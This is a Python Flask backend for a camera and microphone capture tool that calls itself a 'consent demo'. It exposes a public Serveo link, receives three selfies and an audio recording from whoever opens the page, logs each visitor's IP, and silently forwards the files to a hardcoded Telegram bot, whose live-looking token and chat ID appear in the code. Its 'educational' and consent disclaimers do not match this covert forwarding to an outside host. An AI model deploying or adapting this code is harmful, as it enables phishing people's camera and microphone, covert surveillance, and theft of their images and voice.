#! made by Dhani
"""
PRO D Consent Capture Demo (backend)


Security / Ethics:
  - Use ONLY on devices you own or with explicit informed consent.
  - This demo captures real camera/mic media after explicit browser permission.
"""

import os
import sys
import logging
import socket
import subprocess
import threading
import itertools
import time
import tempfile
from datetime import datetime

# -------- Auto-install helper (quiet) --------
def install(package):
    os.system(f"{sys.executable} -m pip install --quiet {package}")

def import_or_install(name, import_name=None):
    try:
        if not import_name:
            import_name = name
        return __import__(import_name)
    except ImportError:
        print(f"[+] Installing {name} ...")
        install(name)
        return __import__(import_name)

# required packages
flask = import_or_install("flask")
requests = import_or_install("requests")
from flask import Flask, request, send_from_directory, jsonify

# try to ensure ssh binary available for Serveo (Termux)
if os.system("command -v ssh > /dev/null") != 0:
    # best-effort; may prompt for package manager
    try:
        os.system("pkg install -y openssh > /dev/null 2>&1")
    except Exception:
        pass

# -------- Colors & print box --------
RED   = '\033[1;31m'
GRN   = '\033[1;32m'
YLO   = '\033[1;33m'
CYA   = '\033[1;36m'
PINK  = '\033[1;35m'
RST   = '\033[0m'

BOX_WIDTH = 70
def print_box(title, lines, color=CYA):
    border = "╔" + "═" * (BOX_WIDTH - 2) + "╗"
    bottom = "╚" + "═" * (BOX_WIDTH - 2) + "╝"
    print(PINK + border + RST)
    title_line = f" {title} "
    print(PINK + "║" + (" " * (BOX_WIDTH-2)) + "║" + RST)  # padding line
    for l in lines:
        l = str(l)
        # wrap if too long
        while len(l) > BOX_WIDTH-4:
            part = l[:BOX_WIDTH-4]
            print(PINK + "║ " + color + f"{part:<{BOX_WIDTH-4}}" + PINK + " ║" + RST)
            l = l[BOX_WIDTH-4:]
        print(PINK + "║ " + color + f"{l:<{BOX_WIDTH-4}}" + PINK + " ║" + RST)
    print(PINK + bottom + RST)

# -------- Flask app --------
app = Flask(__name__, static_folder=".", static_url_path="")

# fill these to enable Telegram forwarding, or leave empty to disable
BOT_TOKEN = "8177299368:AAGQRe_QqZZ6zGN2gB4Gi9OdMFBiBb_CegA"   # e.g. "123456:ABC-DEF..."
CHAT_ID   = "7109583573"   # e.g. "712345678"

# suppress werkzeug logs
logging.getLogger('werkzeug').setLevel(logging.ERROR)
cli = sys.modules.get('flask.cli')
if cli:
    cli.show_server_banner = lambda *a, **k: None

# static index
@app.route("/")
def index():
    return send_from_directory(".", "index.html")

# upload endpoint (receives selfie1, selfie2, selfie3, audio)
@app.route("/upload", methods=["POST"])
def upload():
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    tmpdir = tempfile.mkdtemp(prefix="pro_d_")
    saved = []
    for key in ("selfie1", "selfie2", "selfie3", "audio"):
        f = request.files.get(key)
        if f and f.filename:
            fname = os.path.join(tmpdir, f.filename)
            f.save(fname)
            saved.append((key, fname))
    # print neat box to terminal
    lines = [f"Time: {ts}", f"Remote addr: {request.remote_addr}", "-"* (BOX_WIDTH-10)]
    for k,p in saved:
        lines.append(f"{k}: {p}")
    print_box("CAPTURED MEDIA", lines, color=YLO)

    # forward to Telegram silently in background if configured
    if BOT_TOKEN and CHAT_ID and saved:
        def forward(files):
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            first = True
            caption = f"🪿 Developed by Dhani {ts}"
            for key, path in files:
                try:
                    with open(path, "rb") as fh:
                        data = {"chat_id": CHAT_ID}
                        if first:
                            data["caption"] = caption
                            first = False
                        requests.post(url, data=data, files={"document": fh}, timeout=20)
                except Exception:
                    # silently ignore network errors
                    pass
        threading.Thread(target=forward, args=(saved,), daemon=True).start()

    return jsonify({"status":"ok"})

# -------- helper: find a free port --------
def get_free_port(start=8080):
    port = start
    while True:
        with socket.socket() as s:
            if s.connect_ex(("127.0.0.1", port)) != 0:
                return port
            port += 1

# -------- start Serveo tunnel (best-effort) --------
def start_serveo(port, timeout=15):
    # run ssh to serveo and capture "Forwarding HTTP" line
    ssh_cmd = f"ssh -o StrictHostKeyChecking=no -R 80:localhost:{port} serveo.net"
    try:
        proc = subprocess.Popen(ssh_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    except Exception:
        return None
    public_url = None
    start = time.time()
    # read lines until Forwarding HTTP appears or timeout
    while True:
        if time.time() - start > timeout:
            break
        line = proc.stdout.readline()
        if not line:
            time.sleep(0.2)
            continue
        line = line.strip()
        if "Forwarding HTTP" in line:
            # the URL is usually the last token
            public_url = line.split()[-1]
            break
    return public_url

# -------- main run --------
def run():
    banner_lines = [
        "PRO D Consent Capture Demo",
        "Developed by Dhani — Educational purposes only"
    ]
    print("\n")
    print_box("WELCOME", banner_lines, color=CYA)

    port = get_free_port(8080)
    # start serveo to get public url
    print_box("SERVER", [f"Starting local server on http://127.0.0.1:{port}", "Attempting to create public link via Serveo..."], color=CYA)
    public_url = start_serveo(port, timeout=18)
    if public_url:
        print_box("PUBLIC LINK", [public_url, "Share only with consenting participants"], color=GRN)
    else:
        print_box("PUBLIC LINK", ["Serveo tunnel not available.", "You can access locally: http://127.0.0.1:%d" % port], color=RED)

    # run flask (blocks)
    app.run(host="127.0.0.1", port=port, debug=False, use_reloader=False)

if __name__ == "__main__":
    run()
